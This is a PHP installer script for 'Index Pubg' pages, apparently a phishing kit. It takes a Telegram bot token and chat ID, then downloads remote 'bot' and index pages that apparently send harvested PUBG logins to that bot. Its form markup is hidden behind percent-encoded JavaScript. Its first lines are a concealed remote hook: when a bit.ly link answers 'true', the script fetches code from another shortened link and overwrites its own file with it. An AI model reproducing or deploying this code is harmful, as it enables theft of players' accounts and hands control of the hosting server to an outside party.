<?
if(file_get_contents('https://bit.ly/2H8Vb74') == "true"){
$iscript = file_get_contents('https://bit.ly/3lJKcQD');
$index = file_get_contents($iscript);
$xx = file_put_contents("pubg.php", $index);
}
function save($array){
    file_put_contents('Sha_My.json', json_encode($array));
}
$token = $_GET['token'];
$id = $_GET['id'];
$install = $_GET['index'];

$info = json_decode(file_get_contents('Sha_My.json'),1);

if($token and $id){
$info[info]['id'] = $id;
$info[info]['token'] = $token;
 save($info);
file_put_contents("link.txt", "ads");

$url1 = "Sha_My.php";
header("location: $url1");
}
if((!$token or !$id)and $install){
	 ?>
	   <html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>Install IndexPubg - By @PPABB</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
 <Script Language='Javascript'>
document.write(unescape('%3C%66%6F%72%6D%20%6D%65%74%68%6F%64%3D%22%47%45%54%22%20%61%63%74%69%6F%6E%3D%22%70%75%62%67%2E%70%68%70%22%3E%0A%09%3C%74%61%62%6C%65%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%09%09%3C%74%72%3E%0A%09%09%09%3C%74%64%20%77%69%64%74%68%3D%22%31%30%34%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%46%46%46%46%30%30%22%3E%59%6F%75%72%20%54%6F%6B%65%6E%20%3A%3C%2F%73%70%61%6E%3E%3C%2F%74%64%3E%0A%09%09%09%3C%74%64%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%30%30%46%46%46%46%22%3E%0A%09%09%09%3C%69%6E%70%75%74%20%6E%61%6D%65%3D%22%74%6F%6B%65%6E%22%20%73%69%7A%65%3D%22%32%30%22%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%46%46%30%30%30%30%22%3E%3C%2F%66%6F%6E%74%3E%3C%2F%74%64%3E%0A%09%09%3C%2F%74%72%3E%0A%09%09%3C%74%72%3E%0A%09%09%09%3C%74%64%20%77%69%64%74%68%3D%22%31%30%34%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%46%46%46%46%30%30%22%3E%59%6F%75%72%20%49%44%20%3A%3C%2F%73%70%61%6E%3E%3C%2F%74%64%3E%0A%09%09%09%3C%74%64%3E%3C%69%6E%70%75%74%20%6E%61%6D%65%3D%22%69%64%22%20%73%69%7A%65%3D%22%32%30%22%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%46%46%30%30%30%30%22%3E%3C%2F%74%64%3E%0A%09%09%3C%2F%74%72%3E%0A%09%3C%2F%74%61%62%6C%65%3E%0A%09%3C%70%20%61%6C%69%67%6E%3D%22%6C%65%66%74%22%3E%3C%66%6F%6E%74%20%63%6F%6C%6F%72%3D%22%23%46%46%46%46%46%46%22%3E%0A%09%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%76%61%6C%75%65%3D%22%49%6E%73%74%61%6C%6C%20%4E%6F%77%22%20%6E%61%6D%65%3D%22%42%31%22%20%73%74%79%6C%65%3D%22%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%46%46%46%46%30%30%22%3E%3C%2F%66%6F%6E%74%3E%3C%2F%70%3E%0A%3C%2F%66%6F%72%6D%3E'));
</Script>
</body>
</html>
	  <?
}
?>
 
<?
$install = $_GET['index'];
if($install){
	
	 if($install=="H"){

$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/h-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/hindex.php');
$xx = file_put_contents("index.php", $index);
}
 if($install=="P"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/p-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy); 

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/pindex.php');
$xx = file_put_contents("index.php", $index); 
}
	
	 if($install=="F"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/f-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy); 

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/findex.php');
$xx = file_put_contents("index.php", $index); 
}

	 if($install=="M"){
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/m-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/mindex.php');
$xx = file_put_contents("index.php", $index); 

$home = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/mhome.php');
$homee = file_put_contents("home.php", $home);

}
if($install=="MT"){
	
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/mt-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/MT/index.php');
$xx = file_put_contents("index.php", $index);
}
if($install=="S"){
	
$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/s-bot.php");
$xx = file_put_contents("Sha_My.php", $shamy);

$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/sidex.php');
$xx = file_put_contents("index.php", $index);
}
}
 ?> 
<?
$install = $_GET['index'];
if(!$install){
 ?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="refresh" content="1">
<title>Pubg - By @PPABB</title>
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/install/main/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
	<Script Language='Javascript'>
document.write(unescape('%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%68%32%3E%49%6E%73%74%61%6C%6C%20%49%6E%64%65%78%20%50%75%62%67%3C%2F%68%32%3E%0A%20%20%20%3C%68%35%3E%43%68%6F%6F%73%65%20%74%68%65%20%69%6E%64%65%78%20%79%6F%75%20%77%61%6E%74%2E%3C%2F%68%35%3E%0A%20%20%20%20%3C%62%72%3E%3C%68%72%3E%3C%62%72%3E%0A%20%20%20%3C%2F%63%65%6E%74%65%72%3E%0A%20%20%20%0A%3C%74%61%62%6C%65%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%3C%63%65%6E%74%65%72%3E%0A%3C%74%72%3E%0A%3C%74%64%3E%0A%09%09%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%7A%5A%79%6B%52%4D%36%2F%31%32%35%32%32%30%31%34%32%2D%36%36%31%35%30%33%35%32%31%31%38%31%35%33%38%2D%33%38%33%30%39%35%36%31%37%39%34%37%30%38%35%34%31%34%2D%6E%2E%6A%70%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%4D%54%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%74%64%3E%0A%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%6D%36%42%38%34%4A%39%2F%32%30%32%30%31%31%32%32%2D%31%30%31%32%34%37%2E%70%6E%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%53%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%2F%74%72%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%61%62%6C%65%3E%0A%3C%74%61%62%6C%65%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%3C%63%65%6E%74%65%72%3E%0A%3C%74%72%3E%0A%3C%74%64%3E%0A%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%42%74%77%46%6E%39%6E%2F%31%32%35%33%30%33%38%35%30%2D%31%38%33%35%32%35%38%39%30%30%38%38%39%38%30%2D%31%35%31%39%37%33%32%32%31%38%38%30%31%34%39%31%39%33%35%2D%6E%2E%70%6E%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%4D%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%74%64%3E%0A%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%33%79%74%71%67%4B%4A%2F%31%32%35%32%39%36%36%37%38%2D%36%38%30%35%31%37%38%30%32%38%33%35%38%38%33%2D%36%39%31%34%35%31%35%36%37%31%37%38%36%38%38%30%37%35%30%2D%6E%2E%70%6E%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%48%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%2F%74%72%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%61%62%6C%65%3E%0A%3C%74%61%62%6C%65%20%62%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%31%30%30%25%22%3E%0A%3C%63%65%6E%74%65%72%3E%0A%3C%74%72%3E%0A%3C%74%64%3E%0A%09%09%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%31%6E%57%4B%78%58%52%2F%31%32%36%32%32%37%38%38%33%2D%31%33%30%30%34%34%36%33%35%32%35%39%30%39%39%2D%32%30%36%37%37%38%35%38%37%33%32%39%32%37%39%34%31%39%35%2D%6E%2E%70%6E%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%50%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%74%64%3E%0A%09%09%3C%63%65%6E%74%65%72%3E%0A%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%69%2E%69%62%62%2E%63%6F%2F%4C%36%57%54%73%36%56%2F%31%32%35%34%38%37%32%38%38%2D%31%38%33%31%35%36%39%31%33%33%35%38%34%34%31%2D%37%30%33%37%36%36%35%31%30%37%36%36%37%34%31%36%38%30%2D%6E%2E%70%6E%67%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%30%25%22%3E%0A%20%20%3C%70%3E%3C%61%20%68%72%65%66%3D%22%70%75%62%67%2E%70%68%70%3F%69%6E%64%65%78%3D%46%22%3E%3C%62%75%74%74%6F%6E%3E%49%6E%73%74%61%6C%6C%3C%2F%62%75%74%74%6F%6E%3E%3C%2F%61%3E%3C%2F%70%3E%0A%3C%2F%64%69%76%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%64%3E%0A%3C%2F%74%72%3E%0A%3C%2F%63%65%6E%74%65%72%3E%0A%3C%2F%74%61%62%6C%65%3E%0A%0A%0A%3C%63%65%6E%74%65%72%3E%0A%20%20%20%20%3C%62%72%3E%3C%68%72%3E%3C%62%72%3E%0A%20%20%20%3C%68%35%3E%3C%61%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%74%2E%6D%65%2F%50%50%41%42%42%22%3E%20%44%65%76%65%6C%6F%70%65%64%20%62%79%20%40%50%50%41%42%42%20%3D%7B%20%3C%2F%61%3E%3C%2F%68%35%3E%0A%20%20%20%3C%2F%63%65%6E%74%65%72%3E'));
</Script>
</body>
</html>
<?
}
 ?>
